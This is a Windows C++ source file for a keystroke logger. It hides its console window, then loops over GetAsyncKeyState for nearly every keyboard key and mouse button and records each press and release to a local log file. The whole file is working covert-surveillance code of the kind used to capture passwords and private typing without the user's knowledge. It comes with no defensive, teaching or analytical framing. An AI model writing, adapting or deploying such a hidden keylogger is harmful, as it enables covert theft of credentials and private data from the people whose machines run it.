/* Import */
#include <codecvt> // Code Converter
#include <cuchar> // C Universal Characters
#include <fstream> // File Stream
#include <windows.h> // WIndows

/* Main --- UPDATE (Lapys) -> Very primitive, but works. */
int main(void) {
    // Initialization > (File Stream, Key State)
    std::wfstream fileStream;
    SHORT keyState;

    // Update > File Stream
    fileStream.imbue(std::locale(fileStream.getloc(), new std::codecvt_utf16<wchar_t, 0x10FFFF, static_cast<std::codecvt_mode>(std::consume_header | std::little_endian | std::generate_header)>(1)));
    fileStream.open("keyboard-keystroke-logger.log", std::ios::binary | std::ios::out);

    // ...
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);

    // Loop
    while (true) {
        // Initialization > Key Active
        bool keyActive = true;

        // Logic
        if ((keyState = ::GetAsyncKeyState(0x30))) fileStream.write(L"[0", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x31))) fileStream.write(L"[1", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x32))) fileStream.write(L"[2", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x33))) fileStream.write(L"[3", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x34))) fileStream.write(L"[4", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x35))) fileStream.write(L"[5", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x36))) fileStream.write(L"[6", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x37))) fileStream.write(L"[7", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x38))) fileStream.write(L"[8", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x39))) fileStream.write(L"[9", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x41))) fileStream.write(L"[A", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x42))) fileStream.write(L"[B", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x43))) fileStream.write(L"[C", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x44))) fileStream.write(L"[D", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x45))) fileStream.write(L"[E", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x46))) fileStream.write(L"[F", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x47))) fileStream.write(L"[G", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x48))) fileStream.write(L"[H", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x49))) fileStream.write(L"[I", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x4A))) fileStream.write(L"[J", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x4B))) fileStream.write(L"[K", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x4C))) fileStream.write(L"[L", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x4D))) fileStream.write(L"[M", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x4E))) fileStream.write(L"[N", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x4F))) fileStream.write(L"[O", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x50))) fileStream.write(L"[P", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x51))) fileStream.write(L"[Q", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x52))) fileStream.write(L"[R", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x53))) fileStream.write(L"[S", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x54))) fileStream.write(L"[T", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x55))) fileStream.write(L"[U", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x56))) fileStream.write(L"[V", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x57))) fileStream.write(L"[W", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x58))) fileStream.write(L"[X", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x59))) fileStream.write(L"[Y", 2u);
        else if ((keyState = ::GetAsyncKeyState(0x5A))) fileStream.write(L"[Z", 2u);
        else if ((keyState = ::GetAsyncKeyState(VK_MULTIPLY))) fileStream.write(L"[\u00D7", 2u);
        else if ((keyState = ::GetAsyncKeyState(VK_ADD))) fileStream.write(L"[+", 2u);
        else if ((keyState = ::GetAsyncKeyState(VK_SUBTRACT))) fileStream.write(L"[-", 2u);
        else if ((keyState = ::GetAsyncKeyState(VK_DECIMAL))) fileStream.write(L"[.", 2u);
        else if ((keyState = ::GetAsyncKeyState(VK_DIVIDE))) fileStream.write(L"[\u00F7", 2u);
        else if ((keyState = ::GetAsyncKeyState(VK_LMENU))) fileStream << L"[<left-alt>";
        else if ((keyState = ::GetAsyncKeyState(VK_RMENU))) fileStream << L"[<right-alt>";
        else if ((keyState = ::GetAsyncKeyState(VK_MENU))) fileStream << L"[<alt>";
        else if ((keyState = ::GetAsyncKeyState(VK_APPS))) fileStream << L"[<app>";
        else if ((keyState = ::GetAsyncKeyState(VK_ATTN))) fileStream << L"[<attention>";
        else if ((keyState = ::GetAsyncKeyState(VK_BACK))) fileStream << L"[<backspace>";
        else if ((keyState = ::GetAsyncKeyState(VK_BROWSER_BACK))) fileStream << L"[<browser-back>";
        else if ((keyState = ::GetAsyncKeyState(VK_BROWSER_FAVORITES))) fileStream << L"[<browser-favorites>";
        else if ((keyState = ::GetAsyncKeyState(VK_BROWSER_FORWARD))) fileStream << L"[<browser-forward>";
        else if ((keyState = ::GetAsyncKeyState(VK_BROWSER_HOME))) fileStream << L"[<browser-home>";
        else if ((keyState = ::GetAsyncKeyState(VK_BROWSER_REFRESH))) fileStream << L"[<browser-refresh>";
        else if ((keyState = ::GetAsyncKeyState(VK_BROWSER_SEARCH))) fileStream << L"[<browser-search>";
        else if ((keyState = ::GetAsyncKeyState(VK_BROWSER_STOP))) fileStream << L"[<browser-stop>";
        else if ((keyState = ::GetAsyncKeyState(VK_CAPITAL))) fileStream << L"[<capital-lock>";
        else if ((keyState = ::GetAsyncKeyState(VK_RETURN))) fileStream << L"[<carriage-return>";
        else if ((keyState = ::GetAsyncKeyState(VK_CLEAR))) fileStream << L"[<clear>";
        else if ((keyState = ::GetAsyncKeyState(VK_LCONTROL))) fileStream << L"[<left-control>";
        else if ((keyState = ::GetAsyncKeyState(VK_RCONTROL))) fileStream << L"[<right-control>";
        else if ((keyState = ::GetAsyncKeyState(VK_CONTROL))) fileStream << L"[<control>";
        else if ((keyState = ::GetAsyncKeyState(VK_CANCEL))) fileStream << L"[<control-break>";
        else if ((keyState = ::GetAsyncKeyState(VK_CRSEL))) fileStream << L"[<cursor-select>";
        else if ((keyState = ::GetAsyncKeyState(VK_DELETE))) fileStream << L"[<delete>";
        else if ((keyState = ::GetAsyncKeyState(VK_DOWN))) fileStream << L"[<down-arrow>";
        else if ((keyState = ::GetAsyncKeyState(VK_END))) fileStream << L"[<end>";
        else if ((keyState = ::GetAsyncKeyState(VK_EREOF))) fileStream << L"[<erase-end_of_file>";
        else if ((keyState = ::GetAsyncKeyState(VK_ESCAPE))) fileStream << L"[<escape>";
        else if ((keyState = ::GetAsyncKeyState(VK_EXECUTE))) fileStream << L"[<execute>";
        else if ((keyState = ::GetAsyncKeyState(VK_EXSEL))) fileStream << L"[<ex.-select>";
        else if ((keyState = ::GetAsyncKeyState(VK_F1))) fileStream << L"[<F1>";
        else if ((keyState = ::GetAsyncKeyState(VK_F2))) fileStream << L"[<F2>";
        else if ((keyState = ::GetAsyncKeyState(VK_F3))) fileStream << L"[<F3>";
        else if ((keyState = ::GetAsyncKeyState(VK_F4))) fileStream << L"[<F4>";
        else if ((keyState = ::GetAsyncKeyState(VK_F5))) fileStream << L"[<F5>";
        else if ((keyState = ::GetAsyncKeyState(VK_F6))) fileStream << L"[<F6>";
        else if ((keyState = ::GetAsyncKeyState(VK_F7))) fileStream << L"[<F7>";
        else if ((keyState = ::GetAsyncKeyState(VK_F8))) fileStream << L"[<F8>";
        else if ((keyState = ::GetAsyncKeyState(VK_F9))) fileStream << L"[<F9>";
        else if ((keyState = ::GetAsyncKeyState(VK_F10))) fileStream << L"[<F10>";
        else if ((keyState = ::GetAsyncKeyState(VK_F11))) fileStream << L"[<F11>";
        else if ((keyState = ::GetAsyncKeyState(VK_F12))) fileStream << L"[<F12>";
        else if ((keyState = ::GetAsyncKeyState(VK_F13))) fileStream << L"[<F13>";
        else if ((keyState = ::GetAsyncKeyState(VK_F14))) fileStream << L"[<F14>";
        else if ((keyState = ::GetAsyncKeyState(VK_F15))) fileStream << L"[<F15>";
        else if ((keyState = ::GetAsyncKeyState(VK_F16))) fileStream << L"[<F16>";
        else if ((keyState = ::GetAsyncKeyState(VK_F17))) fileStream << L"[<F17>";
        else if ((keyState = ::GetAsyncKeyState(VK_F18))) fileStream << L"[<F18>";
        else if ((keyState = ::GetAsyncKeyState(VK_F19))) fileStream << L"[<F19>";
        else if ((keyState = ::GetAsyncKeyState(VK_F20))) fileStream << L"[<F20>";
        else if ((keyState = ::GetAsyncKeyState(VK_F21))) fileStream << L"[<F21>";
        else if ((keyState = ::GetAsyncKeyState(VK_F22))) fileStream << L"[<F22>";
        else if ((keyState = ::GetAsyncKeyState(VK_F23))) fileStream << L"[<F23>";
        else if ((keyState = ::GetAsyncKeyState(VK_F24))) fileStream << L"[<F24>";
        else if ((keyState = ::GetAsyncKeyState(VK_HELP))) fileStream << L"[<help>";
        else if ((keyState = ::GetAsyncKeyState(VK_HOME))) fileStream << L"[<home>";
        else if ((keyState = ::GetAsyncKeyState(VK_TAB))) fileStream << L"[<horizontal-tab>";
        else if ((keyState = ::GetAsyncKeyState(VK_ACCEPT))) fileStream << L"[<ime-accept>";
        else if ((keyState = ::GetAsyncKeyState(VK_CONVERT))) fileStream << L"[<ime-convert>";
        else if ((keyState = ::GetAsyncKeyState(VK_FINAL))) fileStream << L"[<ime-final>";
        else if ((keyState = ::GetAsyncKeyState(VK_HANJA))) fileStream << L"[<ime-hanja>";
        else if ((keyState = ::GetAsyncKeyState(VK_HANGUL))) fileStream << L"[<ime-hangul>";
        else if ((keyState = ::GetAsyncKeyState(VK_JUNJA))) fileStream << L"[<ime-junja>";
        else if ((keyState = ::GetAsyncKeyState(VK_KANA))) fileStream << L"[<ime-kana>";
        else if ((keyState = ::GetAsyncKeyState(VK_KANJI))) fileStream << L"[<ime-kanji>";
        else if ((keyState = ::GetAsyncKeyState(VK_MODECHANGE))) fileStream << L"[<ime-mode_change-request>";
        else if ((keyState = ::GetAsyncKeyState(VK_NONCONVERT))) fileStream << L"[<ime-non_convert>";
        else if ((keyState = ::GetAsyncKeyState(VK_PROCESSKEY))) fileStream << L"[<ime-process>";
        else if ((keyState = ::GetAsyncKeyState(VK_INSERT))) fileStream << L"[<insert>";
        else if ((keyState = ::GetAsyncKeyState(VK_LAUNCH_APP1))) fileStream << L"[<launch-application-1>";
        else if ((keyState = ::GetAsyncKeyState(VK_LAUNCH_APP2))) fileStream << L"[<launch-application-2>";
        else if ((keyState = ::GetAsyncKeyState(VK_LEFT))) fileStream << L"[<left-arrow>";
        else if ((keyState = ::GetAsyncKeyState(VK_LWIN))) fileStream << L"[<left-windows-meta>";
        else if ((keyState = ::GetAsyncKeyState(VK_MEDIA_NEXT_TRACK))) fileStream << L"[<media-next_track>";
        else if ((keyState = ::GetAsyncKeyState(VK_MEDIA_PLAY_PAUSE))) fileStream << L"[<media-play_pause>";
        else if ((keyState = ::GetAsyncKeyState(VK_MEDIA_PREV_TRACK))) fileStream << L"[<media-previous_track>";
        else if ((keyState = ::GetAsyncKeyState(VK_MEDIA_STOP))) fileStream << L"[<media-stop>";
        else if ((keyState = ::GetAsyncKeyState(VK_NUMLOCK))) fileStream << L"[<numlock>";
        else if ((keyState = ::GetAsyncKeyState(VK_NUMPAD0))) fileStream << L"[<numpad-0>";
        else if ((keyState = ::GetAsyncKeyState(VK_NUMPAD1))) fileStream << L"[<numpad-1>";
        else if ((keyState = ::GetAsyncKeyState(VK_NUMPAD2))) fileStream << L"[<numpad-2>";
        else if ((keyState = ::GetAsyncKeyState(VK_NUMPAD3))) fileStream << L"[<numpad-3>";
        else if ((keyState = ::GetAsyncKeyState(VK_NUMPAD4))) fileStream << L"[<numpad-4>";
        else if ((keyState = ::GetAsyncKeyState(VK_NUMPAD5))) fileStream << L"[<numpad-5>";
        else if ((keyState = ::GetAsyncKeyState(VK_NUMPAD6))) fileStream << L"[<numpad-6>";
        else if ((keyState = ::GetAsyncKeyState(VK_NUMPAD7))) fileStream << L"[<numpad-7>";
        else if ((keyState = ::GetAsyncKeyState(VK_NUMPAD8))) fileStream << L"[<numpad-8>";
        else if ((keyState = ::GetAsyncKeyState(VK_NUMPAD9))) fileStream << L"[<numpad-9>";
        else if ((keyState = ::GetAsyncKeyState(VK_NEXT))) fileStream << L"[<page-down>";
        else if ((keyState = ::GetAsyncKeyState(VK_PRIOR))) fileStream << L"[<page-up>";
        else if ((keyState = ::GetAsyncKeyState(VK_PLAY))) fileStream << L"[<play>";
        else if ((keyState = ::GetAsyncKeyState(VK_SNAPSHOT))) fileStream << L"[<print-screen>";
        else if ((keyState = ::GetAsyncKeyState(VK_LBUTTON))) fileStream << L"[<mouse -> left-button>";
        else if ((keyState = ::GetAsyncKeyState(VK_MBUTTON))) fileStream << L"[<mouse -> middle-button>";
        else if ((keyState = ::GetAsyncKeyState(VK_RBUTTON))) fileStream << L"[<mouse -> right-button>";
        else if ((keyState = ::GetAsyncKeyState(VK_XBUTTON1))) fileStream << L"[<mouse -> x1-button>";
        else if ((keyState = ::GetAsyncKeyState(VK_XBUTTON2))) fileStream << L"[<mouse -> x2-button>";
        else if ((keyState = ::GetAsyncKeyState(VK_PA1))) fileStream << L"[<PA1>";
        else if ((keyState = ::GetAsyncKeyState(VK_OEM_CLEAR))) fileStream << L"[<OEM-clear>";
        else if ((keyState = ::GetAsyncKeyState(VK_OEM_102))) fileStream << L"[<OEM-miscellaneous>";
        else if ((keyState = (
            ::GetAsyncKeyState(0x92) || ::GetAsyncKeyState(0x93) || ::GetAsyncKeyState(0x94) || ::GetAsyncKeyState(0x95) || ::GetAsyncKeyState(0x96) ||
            ::GetAsyncKeyState(0xE1) ||
            ::GetAsyncKeyState(0xE3) || ::GetAsyncKeyState(0xE4) ||
            ::GetAsyncKeyState(0xE6) ||
            ::GetAsyncKeyState(0xE9) || ::GetAsyncKeyState(0xEA) || ::GetAsyncKeyState(0xEB) || ::GetAsyncKeyState(0xEC) || ::GetAsyncKeyState(0xED) || ::GetAsyncKeyState(0xEF) || ::GetAsyncKeyState(0xF0) || ::GetAsyncKeyState(0xF1) || ::GetAsyncKeyState(0xF2) || ::GetAsyncKeyState(0xF3) || ::GetAsyncKeyState(0xF4) || ::GetAsyncKeyState(0xF5)
        ))) fileStream << L"[<OEM-specific>";
        else if ((keyState = ::GetAsyncKeyState(VK_OEM_1))) fileStream << L"[<OEM-miscellaneous-1>";
        else if ((keyState = ::GetAsyncKeyState(VK_OEM_2))) fileStream << L"[<OEM-miscellaneous-2>";
        else if ((keyState = ::GetAsyncKeyState(VK_OEM_3))) fileStream << L"[<OEM-miscellaneous-3>";
        else if ((keyState = ::GetAsyncKeyState(VK_OEM_4))) fileStream << L"[<OEM-miscellaneous-4>";
        else if ((keyState = ::GetAsyncKeyState(VK_OEM_5))) fileStream << L"[<OEM-miscellaneous-5>";
        else if ((keyState = ::GetAsyncKeyState(VK_OEM_6))) fileStream << L"[<OEM-miscellaneous-6>";
        else if ((keyState = ::GetAsyncKeyState(VK_OEM_7))) fileStream << L"[<OEM-miscellaneous-7>";
        else if ((keyState = ::GetAsyncKeyState(VK_OEM_8))) fileStream << L"[<OEM-miscellaneous-8>";
        else if ((keyState = ::GetAsyncKeyState(VK_OEM_COMMA))) fileStream << L"[<OEM-[,]>";
        else if ((keyState = ::GetAsyncKeyState(VK_OEM_MINUS))) fileStream << L"[<OEM-[-]>";
        else if ((keyState = ::GetAsyncKeyState(VK_OEM_PERIOD))) fileStream << L"[<OEM-[.]>";
        else if ((keyState = ::GetAsyncKeyState(VK_OEM_PLUS))) fileStream << L"[<OEM-[+]>";
        else if ((keyState = ::GetAsyncKeyState(VK_PAUSE))) fileStream << L"[<pause>";
        else if ((keyState = ::GetAsyncKeyState(VK_PRINT))) fileStream << L"[<print>";
        else if ((keyState = (
            ::GetAsyncKeyState(VK_NONAME) ||
            ::GetAsyncKeyState(0x0A) || ::GetAsyncKeyState(0x0B) ||
            ::GetAsyncKeyState(0x0E) || ::GetAsyncKeyState(0x0F) ||
            ::GetAsyncKeyState(0x16) ||
            ::GetAsyncKeyState(0x1A) ||
            ::GetAsyncKeyState(0x3A) || ::GetAsyncKeyState(0x40) ||
            ::GetAsyncKeyState(0x5E) ||
            ::GetAsyncKeyState(0xB8) || ::GetAsyncKeyState(0xB9) ||
            ::GetAsyncKeyState(0xC1) || ::GetAsyncKeyState(0xC2) || ::GetAsyncKeyState(0xC3) || ::GetAsyncKeyState(0xC4) || ::GetAsyncKeyState(0xC5) || ::GetAsyncKeyState(0xC6) || ::GetAsyncKeyState(0xC7) || ::GetAsyncKeyState(0xC8) || ::GetAsyncKeyState(0xC9) || ::GetAsyncKeyState(0xCA) || ::GetAsyncKeyState(0xCB) || ::GetAsyncKeyState(0xCC) || ::GetAsyncKeyState(0xCD) || ::GetAsyncKeyState(0xCE) || ::GetAsyncKeyState(0xCF) || ::GetAsyncKeyState(0xD0) || ::GetAsyncKeyState(0xD1) || ::GetAsyncKeyState(0xD2) || ::GetAsyncKeyState(0xD3) || ::GetAsyncKeyState(0xD4) || ::GetAsyncKeyState(0xD5) || ::GetAsyncKeyState(0xD6) || ::GetAsyncKeyState(0xD7) ||
            ::GetAsyncKeyState(0xE0)
        ))) fileStream << L"[<reserved>";
        else if ((keyState = ::GetAsyncKeyState(VK_RIGHT))) fileStream << L"[<right-arrow>";
        else if ((keyState = ::GetAsyncKeyState(VK_RWIN))) fileStream << L"[<right-windows-meta>";
        else if ((keyState = ::GetAsyncKeyState(VK_SCROLL))) fileStream << L"[<scrolllock>";
        else if ((keyState = ::GetAsyncKeyState(VK_SELECT))) fileStream << L"[<select>";
        else if ((keyState = ::GetAsyncKeyState(VK_SEPARATOR))) fileStream << L"[<separator>";
        else if ((keyState = ::GetAsyncKeyState(VK_LSHIFT))) fileStream << L"[<left-shift>";
        else if ((keyState = ::GetAsyncKeyState(VK_RSHIFT))) fileStream << L"[<right-shift>";
        else if ((keyState = ::GetAsyncKeyState(VK_LAUNCH_MEDIA_SELECT))) fileStream << L"[<select-media>";
        else if ((keyState = ::GetAsyncKeyState(VK_SHIFT))) fileStream << L"[<shift>";
        else if ((keyState = ::GetAsyncKeyState(VK_SLEEP))) fileStream << L"[<sleep>";
        else if ((keyState = ::GetAsyncKeyState(VK_SPACE))) fileStream << L"[<spacebar>";
        else if ((keyState = ::GetAsyncKeyState(VK_LAUNCH_MAIL))) fileStream << L"[<start-mail>";
        else if ((keyState = (
            ::GetAsyncKeyState(0x88) || ::GetAsyncKeyState(0x89) || ::GetAsyncKeyState(0x8A) || ::GetAsyncKeyState(0x8B) || ::GetAsyncKeyState(0x8C) || ::GetAsyncKeyState(0x8D) || ::GetAsyncKeyState(0x8E) || ::GetAsyncKeyState(0x8F) ||
            ::GetAsyncKeyState(0x97) || ::GetAsyncKeyState(0x98) || ::GetAsyncKeyState(0x99) || ::GetAsyncKeyState(0x9A) || ::GetAsyncKeyState(0x9B) || ::GetAsyncKeyState(0x9C) || ::GetAsyncKeyState(0x9D) || ::GetAsyncKeyState(0x9E) || ::GetAsyncKeyState(0x9F) ||
            ::GetAsyncKeyState(0xD8) || ::GetAsyncKeyState(0xD9) || ::GetAsyncKeyState(0xDA) ||
            ::GetAsyncKeyState(0xE8)
        ))) fileStream << L"[<unassigned>";
        else if ((keyState = ::GetAsyncKeyState(0x07))) fileStream << L"[<undefined>";
        else if ((keyState = ::GetAsyncKeyState(VK_UP))) fileStream << L"[<up-arrow>";
        else if ((keyState = ::GetAsyncKeyState(VK_VOLUME_DOWN))) fileStream << L"[<volume-down>";
        else if ((keyState = ::GetAsyncKeyState(VK_VOLUME_MUTE))) fileStream << L"[<volume-mute>";
        else if ((keyState = ::GetAsyncKeyState(VK_VOLUME_UP))) fileStream << L"[<volume-up>";
        else if ((keyState = ::GetAsyncKeyState(VK_ZOOM))) fileStream << L"[<zoom>";
        else keyActive = false;

        // Logic
        if (keyActive) {
            // Logic > ...
            if (keyState & (1u << (sizeof(SHORT) * 8u - 1u))) fileStream.write(L" (down)] ", 9u);
            else fileStream.write(L" (up)] ", 7u);

            // ...
            fileStream.put(L'\n');
        }
    }

    // ...
    fileStream.close();

    // Return
    return 0;
}
